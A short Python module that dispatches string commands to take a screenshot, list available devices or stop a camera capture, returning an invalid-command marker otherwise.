from . import *

INVALID_COMMAND = "INVALID_COMMAND"

screenshot = "screenshot"
get_available_devices_command = "get_available_devices"

def get_result(command, args):
    if command == screenshot:
        return Visuals.screenshot(*args)

    elif command == get_available_devices_command:
        return get_available_devices(*args)

    elif command == "stop_camera":
        img_grab_obj.stop()
    
    else:
        return INVALID_COMMAND

